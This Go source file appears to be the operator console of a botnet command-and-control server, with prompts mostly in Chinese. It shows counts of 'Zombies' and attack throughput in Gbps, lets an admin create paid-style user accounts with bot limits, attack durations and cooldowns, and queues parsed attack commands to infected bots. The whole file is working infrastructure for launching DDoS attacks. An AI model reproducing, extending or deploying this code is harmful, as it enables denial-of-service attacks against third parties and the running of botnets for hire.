package main

import (
	"fmt"
	"io"
	"strconv"
	"strings"
	"time"

	"golang.org/x/term"
)

type Admin struct {
	term       *term.Terminal
	rawWriter  io.Writer
	userInfo   AccountInfo
}

func (this *Admin) Handle() {
	username := this.userInfo.username

	go func() {
		for {
			if this.rawWriter != nil {
				stats := clientList.GetStats()
				this.rawWriter.Write([]byte(fmt.Sprintf(
					"\033]0;Zombies: %d | Free: %d Busy: %d | %s | Attacks: %d | Speed: %.2f Gbps\007",
					stats.Zombies, stats.Free, stats.Busy, username, stats.ActiveAttacks, stats.SpeedGbps)))
			}
			time.Sleep(3 * time.Second)
		}
	}()

	this.term.Write([]byte("\r\n\033[0m"))
	this.term.Write([]byte(uiManager.GetScreen("home", nil)))

	for {
		var botCatagory string

		cmd, err := this.term.ReadLine()
		if err != nil {
			return
		}

		if cmd == "clear" || cmd == "cls" || cmd == "CLEAR" {
			this.term.Write([]byte(uiManager.GetScreen("home", nil)))
			continue
		}

		if cmd == "METHODS" || cmd == "methods" {
			this.term.Write([]byte(uiManager.GetScreen("methods", nil)))
			continue
		}

		if cmd == "help" || cmd == "HELP" || cmd == "?" {
			this.term.Write([]byte(uiManager.GetScreen("help", nil)))
			continue
		}

		if cmd == "chud" || cmd == "CHUD" {
			this.term.Write([]byte(uiManager.GetScreen("chud", nil)))
			continue
		}

		if cmd == "exit" || cmd == "quit" {
			return
		}

		if cmd == "" {
			continue
		}

		botCount := this.userInfo.maxBots

		if this.userInfo.admin == 1 && cmd == "adduser" {
			this.term.Write([]byte(theme.Value("请输入新用户名: ")))
			new_un, err := this.term.ReadLine()
			if err != nil {
				return
			}
			this.term.Write([]byte(theme.Value("请输入新密码: ")))
			new_pw, err := this.term.ReadLine()
			if err != nil {
				return
			}
			this.term.Write([]byte(theme.Value("请输入Bot数量限制(-1表示全部): ")))
			max_bots_str, err := this.term.ReadLine()
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.term.Write([]byte(theme.Err("Bot数量格式错误") + "\r\n"))
				continue
			}
			this.term.Write([]byte(theme.Value("最大攻击持续时间(-1为不限): ")))
			duration_str, err := this.term.ReadLine()
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.term.Write([]byte(theme.Err("持续时间格式错误") + "\r\n"))
				continue
			}
			this.term.Write([]byte(theme.Value("冷却时间(0为不限): ")))
			cooldown_str, err := this.term.ReadLine()
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.term.Write([]byte(theme.Err("冷却时间格式错误") + "\r\n"))
				continue
			}
			this.term.Write([]byte(theme.Value("允许代理访问? (1=是, 0=否): ")))
			proxy_str, err := this.term.ReadLine()
			if err != nil {
				return
			}
			proxyAllowed, err := strconv.Atoi(proxy_str)
			if err != nil {
				proxyAllowed = 0
			}
			this.term.Write([]byte(theme.Label("新账户信息: \r\n用户名: " + new_un + "\r\n密码: " + new_pw + "\r\nBot数量: " + max_bots_str + "\r\n代理: " + proxy_str + "\r\n确认添加? (y/N)")))
			confirm, err := this.term.ReadLine()
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown, proxyAllowed) {
				this.term.Write([]byte(theme.Err("添加用户失败，发生未知错误") + "\r\n"))
			} else {
				this.term.Write([]byte(theme.Succ("用户添加成功") + "\r\n"))
			}
			continue
		}

		if this.userInfo.admin == 1 && (cmd == "removeuser" || cmd == "remuser") {
			this.term.Write([]byte(theme.Value("请输入要删除的用户名: ")))
			new_un, err := this.term.ReadLine()
			if err != nil {
				return
			}
			this.term.Write([]byte(theme.Warn("删除用户: " + new_un + " 确认?") + "\r\n (y/N)"))
			confirm, err := this.term.ReadLine()
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(new_un) {
				this.term.Write([]byte(theme.Err("删除用户失败，发生未知错误") + "\r\n"))
			} else {
				this.term.Write([]byte(theme.Succ("用户删除成功") + "\r\n"))
			}
			continue
		}

		if this.userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
			this.term.Write([]byte(theme.Head("   ═══════════════════") + "\r\n"))
			this.term.Write([]byte(theme.Label("    CHUD总数:") + theme.Sep() + theme.Value(fmt.Sprintf(" %d", botCount)) + "\r\n"))
			this.term.Write([]byte(theme.Head("   ═══════════════════") + "\r\n"))
			continue
		}

		if this.userInfo.admin == 1 && strings.HasPrefix(cmd, "grantproxy ") {
			targetUser := strings.TrimPrefix(cmd, "grantproxy ")
			if database.SetProxyAllowed(targetUser, 1) {
				this.term.Write([]byte(theme.Succ(fmt.Sprintf("已授予 %s 代理访问权限", targetUser)) + "\r\n"))
			} else {
				this.term.Write([]byte(theme.Err(fmt.Sprintf("未找到用户 %s", targetUser)) + "\r\n"))
			}
			continue
		}

		if this.userInfo.admin == 1 && strings.HasPrefix(cmd, "revokeproxy ") {
			targetUser := strings.TrimPrefix(cmd, "revokeproxy ")
			if database.SetProxyAllowed(targetUser, 0) {
				this.term.Write([]byte(theme.Succ(fmt.Sprintf("已撤销 %s 的代理访问权限", targetUser)) + "\r\n"))
			} else {
				this.term.Write([]byte(theme.Err(fmt.Sprintf("未找到用户 %s", targetUser)) + "\r\n"))
			}
			continue
		}

		if this.userInfo.admin == 1 && cmd == "proxylist" {
			users := database.ListProxyUsers()
			if len(users) == 0 {
				this.term.Write([]byte(theme.Label("没有用户拥有代理访问权限") + "\r\n"))
			} else {
				this.term.Write([]byte(theme.Head("   ═══════ 代理用户列表 ═══════") + "\r\n"))
				for _, u := range users {
					this.term.Write([]byte(theme.Value(fmt.Sprintf("    %s", u.username)) + "\r\n"))
				}
			}
			continue
		}

		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.term.Write([]byte(theme.Err(fmt.Sprintf("Bot数量格式错误 \"%s\"", count)) + "\r\n"))
				continue
			}
			if this.userInfo.maxBots != -1 && botCount > this.userInfo.maxBots {
				this.term.Write([]byte(theme.Err("发送的Bot数量超过了允许的最大值") + "\r\n"))
				continue
			}
			if len(countSplit) < 2 {
				continue
			}
			cmd = countSplit[1]
		}
		if strings.Contains(cmd, "bots=") {
			for _, part := range strings.Split(cmd, " ") {
				if strings.HasPrefix(part, "bots=") {
					c, err := strconv.Atoi(strings.TrimPrefix(part, "bots="))
					if err == nil && c > 0 {
						botCount = c
						cmd = strings.ReplaceAll(cmd, " "+part, "")
						cmd = strings.ReplaceAll(cmd, part+" ", "")
						cmd = strings.ReplaceAll(cmd, part, "")
					}
					break
				}
			}
			cmd = strings.TrimSpace(cmd)
		}
		if len(cmd) > 0 && this.userInfo.admin == 1 && cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			if len(cataSplit) < 2 {
				continue
			}
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, this.userInfo.admin)
		if err != nil {
			this.term.Write([]byte(theme.Err(err.Error()) + "\r\n"))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.term.Write([]byte(theme.Err(err.Error()) + "\r\n"))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.term.Write([]byte(theme.Err(err.Error()) + "\r\n"))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}
